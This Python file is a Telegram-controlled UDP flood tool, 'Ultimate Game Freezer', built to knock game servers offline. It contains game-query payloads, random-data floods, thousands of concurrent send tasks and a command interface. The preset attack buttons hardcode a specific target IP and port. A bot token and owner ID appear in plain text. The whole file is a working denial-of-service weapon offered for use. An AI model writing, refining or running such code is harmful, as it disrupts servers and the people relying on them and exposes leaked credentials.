#!/usr/bin/env python3
"""
ULTIMATE GAME FREEZER v3.0 — TELEGRAM INTEGRATED
Render-optimized: No input() prompts, health server included.
"""

import asyncio
import socket
import random
import time
import argparse
import sys
import os
import threading

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# ─── CONFIG ───────────────────────────────────────────────────────────────────
BOT_TOKEN = "8824657166:AAF_emEYxOjlMwMw8MEixEpq6rQzWFFyLUg"
ALLOWED_USERS = [7504108653]
# ──────────────────────────────────────────────────────────────────────────────

# ─── ORIGINAL GAME PAYLOADS (FULLY PRESERVED) ────────────────────────────────
GAME_PAYLOADS = [
    b'\xFF\xFF\xFF\xFF\x02',                    # Source Query
    b'\xFE\xFE\xFE\xFE\xFF\xFF\xFF\xFF\x53\x00\x41\x00',  # GoldSrc
    b'\x00\xFF\xFF\x00\x66\x6F\x6F\x00',        # Quake3
    b'\xFF\xFF\xFF\xFFstatus\x0A',              # Q3A
    lambda: random._urandom(1400),              # Random flood
    b'\x54\x53\x65\x72\x76\x65\x72\x51\x75\x65\x72\x79' * 100,  # TS spam
]

# ─── STATE ────────────────────────────────────────────────────────────────────
active_attacks = {}

# ─── BANNER ──────────────────────────────────────────────────────────────────

def banner():
    print("""
╦ ╦┌─┐┌┐┌┬ ┬┌┬┐┌─┐┌─┐┌┬┐
║║║├┤ │││├─┤ │ ├┤ └─┐ │ 
╚╩╝└─┘┘└┘┴ ┴ ┴ └─┘└─┘ ┴ 
         v3.0 ULTIMATE 💀❄️
    
MAKE BY SAMIT | TERMUX POWER
════════════════════════════════════════════════════════════
""")

# ─── CORE ATTACK ENGINE (ORIGINAL - UNCHANGED) ──────────────────────────────

async def ultimate_killer(target_ip, target_port, duration, payload_id):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    end_time = time.time() + duration
    packets = 0

    while time.time() < end_time:
        try:
            if callable(payload_id):
                data = payload_id()
            else:
                data = payload_id
            sock.sendto(data, (target_ip, target_port))
            packets += 1
        except:
            pass

    sock.close()
    return packets

async def real_freezer(target, threads=3000, duration=300):
    try:
        ip, port = target.split(':')
        port = int(port)
    except:
        print("INVALID FORMAT: Use IP:PORT")
        return

    print(f"ULTIMATE GAME FREEZER ACTIVATED")
    print(f"TARGET: {target}")
    print(f"DURATION: {duration}s")
    print(f"THREADS: {threads:,}")

    payloads = GAME_PAYLOADS * 5
    tasks = []

    for i in range(threads):
        payload = payloads[i % len(payloads)]
        task = asyncio.create_task(ultimate_killer(ip, port, duration, payload))
        tasks.append(task)

    print("ATTACK IN PROGRESS...")
    await asyncio.gather(*tasks, return_exceptions=True)

    print("MISSION COMPLETE!")
    print(f"TARGET FROZEN: {target}")
    print(f"TIME ELAPSED: {duration}s")

# ─── TELEGRAM BOT HANDLERS ────────────────────────────────────────────────

async def is_authorized(update: Update) -> bool:
    user_id = update.effective_user.id
    if user_id not in ALLOWED_USERS:
        await update.message.reply_text("⛔ Unauthorized. Only bot owner can use this.")
        return False
    return True

async def run_freezer_tg(target: str, duration: int, threads: int, chat_id: int, context: ContextTypes.DEFAULT_TYPE):
    """Run the attack and report to Telegram."""
    await context.bot.send_message(
        chat_id=chat_id,
        text=f"💀 *ATTACK LAUNCHED*\n🎯 `{target}`\n⏱ `{duration}s`\n⚡ `{threads:,}` threads\n\nUse /stop to abort",
        parse_mode="Markdown"
    )

    attack_task = asyncio.create_task(real_freezer(target, threads, duration))
    active_attacks[chat_id] = attack_task

    try:
        await asyncio.wait_for(attack_task, timeout=duration + 30)
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"✅ *MISSION COMPLETE*\n🎯 `{target}` frozen for `{duration}s`",
            parse_mode="Markdown"
        )
    except asyncio.TimeoutError:
        attack_task.cancel()
        await context.bot.send_message(chat_id=chat_id, text="⚠️ Attack timed out, force stopped.")
    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"❌ Error: `{str(e)[:200]}`", parse_mode="Markdown")
    finally:
        active_attacks.pop(chat_id, None)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_authorized(update): return
    keyboard = [
        [InlineKeyboardButton("💀 Quick Freeze (300s, 3000 threads)", callback_data="quick")],
        [InlineKeyboardButton("🔥 Mega Attack (600s, 4000 threads)", callback_data="mega")],
        [InlineKeyboardButton("❄️ Light Lag (200s, 500 threads)", callback_data="light")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "💀 *ULTIMATE GAME FREEZER — TELEGRAM*\n\n"
        "🎮 Commands:\n"
        "`/freeze IP:PORT [sec] [threads]`\n"
        "`/stop` — Kill attack\n"
        "`/status` — Check status\n\n"
        "*Quick buttons below:*",
        parse_mode="Markdown", reply_markup=reply_markup
    )

async def freeze_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_authorized(update): return
    chat_id = update.effective_chat.id

    if chat_id in active_attacks:
        await update.message.reply_text("⚠️ Attack already running! Use /stop first.")
        return

    args = context.args
    if len(args) < 1:
        await update.message.reply_text("Usage: `/freeze IP:PORT [seconds] [threads]`", parse_mode="Markdown")
        return

    target = args[0]
    duration = int(args[1]) if len(args) > 1 else 300
    threads = int(args[2]) if len(args) > 2 else 3000

    asyncio.create_task(run_freezer_tg(target, duration, threads, chat_id, context))

async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_authorized(update): return
    chat_id = update.effective_chat.id

    if chat_id not in active_attacks:
        await update.message.reply_text("❌ No active attack.")
        return

    active_attacks[chat_id].cancel()
    active_attacks.pop(chat_id, None)
    await update.message.reply_text("🛑 *Attack stopped!*", parse_mode="Markdown")

async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_authorized(update): return
    chat_id = update.effective_chat.id

    if chat_id in active_attacks:
        await update.message.reply_text("💀 *Attack is RUNNING*", parse_mode="Markdown")
    else:
        await update.message.reply_text("🟢 Idle. Ready.")

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    chat_id = update.effective_chat.id

    if query.data == "quick":
        asyncio.create_task(run_freezer_tg("15.206.194.9:7380", 300, 3000, chat_id, context))
    elif query.data == "mega":
        asyncio.create_task(run_freezer_tg("15.206.194.9:7380", 600, 4000, chat_id, context))
    elif query.data == "light":
        asyncio.create_task(run_freezer_tg("15.206.194.9:7380", 200, 500, chat_id, context))
    else:
        await query.edit_message_text("Unknown option.")

async def send_bot_online_notification(application: Application):
    """Send bot online message to the authorized user when bot starts."""
    user_id = ALLOWED_USERS[0]
    try:
        await application.bot.send_message(
            chat_id=user_id,
            text=(
                "🤖 *ULTIMATE GAME FREEZER BOT — ONLINE* 💀\n\n"
                "✅ Bot started successfully on Render!\n"
                "🟢 Ready for attack commands.\n\n"
                "📌 *Available Commands:*\n"
                "`/start` — Show menu\n"
                "`/freeze IP:PORT [sec] [threads]` — Launch attack\n"
                "`/stop` — Abort current attack\n"
                "`/status` — Check attack status\n\n"
                "⚡ *Preset Attacks:*\n"
                "• 💀 Quick Freeze (300s, 3000t)\n"
                "• 🔥 Mega Attack (600s, 4000t)\n"
                "• ❄️ Light Lag (200s, 500t)\n\n"
                "🔥 *Bot is HOT and READY!*"
            ),
            parse_mode="Markdown"
        )
        print(f"✅ Welcome message sent to user {user_id}")
    except Exception as e:
        print(f"⚠️ Could not send welcome message: {e}")

async def post_init(application: Application):
    """Called after app initialization — sends online notification."""
    await send_bot_online_notification(application)

# ─── RENDER HEALTH CHECK SERVER ──────────────────────────────────────────

def run_health_server():
    """Simple HTTP server so Render doesn't kill the process."""
    import http.server
    import socketserver
    
    PORT = int(os.environ.get("PORT", 10000))
    
    class HealthHandler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"ULTIMATE GAME FREEZER BOT RUNNING")
        
        def log_message(self, format, *args):
            pass
    
    with socketserver.TCPServer(("", PORT), HealthHandler) as httpd:
        print(f"✅ Health server running on port {PORT}")
        httpd.serve_forever()

def start_bot():
    """Initialize and start the Telegram bot + health server."""
    print("🤖 Starting Telegram Bot mode...")
    print(f"🔑 Token: {BOT_TOKEN[:10]}...")
    print(f"👤 Owner ID: {ALLOWED_USERS[0]}")
    
    # Start health check server in a separate thread (for Render)
    health_thread = threading.Thread(target=run_health_server, daemon=True)
    health_thread.start()
    
    app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", start))
    app.add_handler(CommandHandler("freeze", freeze_cmd))
    app.add_handler(CommandHandler("stop", stop_cmd))
    app.add_handler(CommandHandler("status", status_cmd))
    app.add_handler(CallbackQueryHandler(button_handler))
    
    print("✅ Bot running on Render! Press Ctrl+C to stop.")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

# ─── CLI MAIN ────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument('--freeze', help='Target IP:PORT')
    parser.add_argument('--attack', help='Target IP:PORT')
    parser.add_argument('--duration', type=int, default=300)
    parser.add_argument('--threads', type=int, default=3000)
    parser.add_argument('--telegram', action='store_true', help='Start Telegram bot mode')

    try:
        args = parser.parse_args()
        if args.telegram:
            # DIRECTLY START BOT — NO INPUT() CALLS
            start_bot()
            return
        if args.freeze or args.attack:
            target = args.freeze or args.attack
            asyncio.run(real_freezer(target, args.threads, args.duration))
            return
    except:
        pass

    # Interactive mode (only runs locally, not on Render with --telegram)
    print("Use --telegram for bot mode or --freeze IP:PORT for direct attack")

if __name__ == '__main__':
    main()
